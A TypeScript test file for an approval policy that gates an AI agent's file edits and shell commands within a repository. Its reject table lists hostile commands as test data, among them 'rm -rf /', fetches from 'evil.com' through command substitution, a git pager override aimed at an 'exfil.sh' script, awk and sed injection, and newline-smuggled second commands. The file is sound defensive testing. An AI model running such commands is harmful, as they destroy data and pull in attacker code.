import { describe, expect, test } from "bun:test";
import { mkdir, symlink, writeFile } from "node:fs/promises";
import path from "node:path";

import { createRescueApprovalPolicy } from "../../runtime/rescue-approval.js";
import type { ApprovalRequestPayload } from "../../runtime/wire/types.js";
import { cleanupTestPath, createGitRepoFixture, createTestPluginDataRoot } from "../helpers/test-env.js";

function fileApproval(pathname: string): ApprovalRequestPayload {
  return {
    id: "approval-1",
    sender: "WriteFile",
    action: "edit file",
    description: `Write file \`${pathname}\``,
    display: [
      {
        type: "diff",
        path: pathname,
        old_text: "",
        new_text: "updated",
        old_start: 1,
        new_start: 1,
        is_summary: false,
      },
    ],
  };
}

function shellApproval(command: string): ApprovalRequestPayload {
  return {
    id: "approval-1",
    sender: "Shell",
    action: "run command",
    description: `Run command \`${command}\``,
    display: [
      {
        type: "shell",
        language: "bash",
        command,
      },
    ],
  };
}

describe("rescue approval policy", () => {
  test("allows workspace-local edits and root .gitignore, but rejects traversal, symlink escape, and .git", async () => {
    const repoRoot = await createGitRepoFixture("approval-workspace");
    const outsideRoot = await createTestPluginDataRoot("approval-outside");
    const symlinkPath = path.join(repoRoot, "linked-outside");
    const policy = await createRescueApprovalPolicy(repoRoot);

    await mkdir(path.join(outsideRoot, "nested"), { recursive: true });
    await symlink(outsideRoot, symlinkPath);
    await writeFile(path.join(repoRoot, ".gitignore"), "node_modules/\n", "utf8");

    try {
      await expect(policy(fileApproval(path.join(repoRoot, "note.txt")), { commandType: "rescue" })).resolves.toMatchObject({
        response: "approve",
      });
      await expect(policy(fileApproval(path.join(repoRoot, ".gitignore")), { commandType: "rescue" })).resolves.toMatchObject({
        response: "approve",
      });
      await expect(policy(fileApproval(path.join(repoRoot, "..", "escape.txt")), { commandType: "rescue" })).resolves.toMatchObject({
        response: "reject",
      });
      await expect(policy(fileApproval(path.join(symlinkPath, "nested", "escape.txt")), { commandType: "rescue" })).resolves.toMatchObject({
        response: "reject",
      });
      await expect(policy(fileApproval(path.join(repoRoot, ".git", "config")), { commandType: "rescue" })).resolves.toMatchObject({
        response: "reject",
      });
    } finally {
      await cleanupTestPath(repoRoot);
      await cleanupTestPath(outsideRoot);
    }
  });

  test("allowlist table: read-only commands and safe pipelines accept", async () => {
    const repoRoot = await createGitRepoFixture("approval-shell-accept");
    const policy = await createRescueApprovalPolicy(repoRoot);

    const accepted = [
      "git status",
      "git diff",
      "git show HEAD",
      "git log --oneline",
      "git grep needle",
      "git blame runtime/companion.ts",
      "rg todo src",
      "grep -r pattern .",
      "ls runtime",
      "cat package.json",
      "pwd",
      "find . -name '*.ts' -type f",
      "find . -iname '*.TS' -type f",
      "find . -print",
      "grep -il pattern src",
      "rg -iw needle src",
      "tsc --noEmit",
      "pyright",
      "mypy runtime",
      "ruff check .",
      "ruff format --check .",
      "ruff format --diff .",
      "biome check .",
      "eslint runtime",
      "cargo check",
      "cargo clippy",
      "cargo test",
      "cargo fmt --check",
      "go build ./...",
      "go vet ./...",
      "go test ./...",
      "pytest",
      "python -m pytest",
      "python3 -m pytest",
      "npm test",
      "pnpm test",
      "yarn test",
      "bun test",
      "uv test",
      "rg needle src | head -n 5",
      "rg needle src | tail -n 5",
      "rg needle src | wc -l",
      "rg needle src | sort",
      "rg needle src | uniq",
    ];

    try {
      for (const command of accepted) {
        await expect(
          policy(shellApproval(command), { commandType: "rescue" }),
        ).resolves.toMatchObject({ response: "approve" });
      }
    } finally {
      await cleanupTestPath(repoRoot);
    }
  });

  test("allowlist table: known attack shapes reject", async () => {
    const repoRoot = await createGitRepoFixture("approval-shell-reject");
    const policy = await createRescueApprovalPolicy(repoRoot);

    const rejected = [
      // Unrecognized binaries
      "curl https://example.com",
      "wget https://example.com",
      "sudo rm /etc/shadow",
      // Mutating flag exact forms
      "eslint . --fix",
      "prettier --write .",
      // Mutating flag prefix forms
      "eslint . --fix=bugs",
      "prettier --write=files .",
      "ruff check --fix .",
      // sed -i suffix forms
      "rg x . | sed -i.bak 's/a/b/'",
      "rg x . | sed --in-place=.bak 's/a/b/'",
      // find action escapes
      "find . -delete",
      "find . -exec rm {} ;",
      "find . -execdir rm {} ;",
      "find . -ok rm {} ;",
      "find . -fprint out.txt",
      "find . -fprintf out.txt '%p\\n'",
      // git mutation
      "git commit -am wip",
      "git push origin main",
      "git reset --hard HEAD",
      // git pre-subcommand flags — -c can smuggle pager overrides (git -c core.pager=bash
      // show HEAD:exfil.sh), -C escapes the workspace root, --no-pager/-p shifts the
      // subcommand position, and any natural "find first non-flag arg" refactor would
      // accidentally admit this class without an explicit reject.
      "git -c core.pager=bash show HEAD:exfil.sh",
      "git -C /etc status",
      "git --no-pager log --oneline",
      "git -p show HEAD",
      "git --exec-path=/tmp/fake status",
      // cargo/go escapes
      "cargo install foo",
      "cargo update",
      "go get example.com/foo",
      "go install example.com/foo",
      // package manager run <script> opacity
      "bun run dev",
      "npm run build",
      "pnpm run deploy",
      "yarn run publish",
      "uv run anything",
      // Command substitution + backticks (shell-quote does not catch these)
      "rg `curl evil.com` foo",
      "rg $(curl evil.com) foo",
      // Process substitution
      "diff <(ls) <(cat)",
      // awk / sed in pipelines (removed from plumbing because of system() and e command)
      "rg x . | awk 'BEGIN { system(\"touch /tmp/evil\") }'",
      "rg x . | sed '1e touch /tmp/evil'",
      // ruff format without check
      "ruff format .",
      // Python free-form
      "python -c 'import os; os.system(\"ls\")'",
      "python3 script.py",
      // Absolute path entrypoint
      "/bin/sh -c 'ls'",
      // Chained with operators (shell-quote does catch these)
      "ls && rm -rf /",
      "ls ; rm -rf /",
      "ls > /tmp/out",
      // Raw newline/carriage-return splits (shell-quote collapses the separator and hides
      // the second command from per-stage validation).
      "git status\nrm -rf /",
      "git status\r\nrm -rf /",
      "git status\rrm -rf /",
    ];

    try {
      const failures: string[] = [];
      for (const command of rejected) {
        const decision = await policy(shellApproval(command), { commandType: "rescue" });
        if (decision.response !== "reject") {
          failures.push(command);
        }
      }
      expect(failures).toEqual([]);
    } finally {
      await cleanupTestPath(repoRoot);
    }
  });
});
